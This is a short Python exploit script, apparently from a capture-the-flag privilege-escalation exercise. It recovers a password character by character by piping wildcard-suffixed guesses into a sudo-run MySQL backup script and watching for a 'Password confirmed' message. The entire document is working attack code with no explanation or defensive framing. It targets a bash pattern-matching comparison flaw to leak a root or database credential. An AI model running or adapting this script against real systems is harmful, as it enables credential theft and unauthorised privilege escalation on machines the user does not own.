#!/usr/bin/env python3

import subprocess
import string

leaked_password = ""

while True:
    for c in string.printable[:-5]:
        if c in '*\\%':
            continue
        print(f"\r{leaked_password}{c}", flush=True, end="")
        result = subprocess.run(f"echo '{leaked_password}{c}*' | \
            sudo /opt/scripts/mysql-backup.sh", stdout=subprocess.\
                PIPE, stderr=subprocess.PIPE, shell=True)
        if "Password confirmed" in result.stdout.decode():
            leaked_password += c
            break
    else:
        break
print(f'\r{leaked_password}        ')
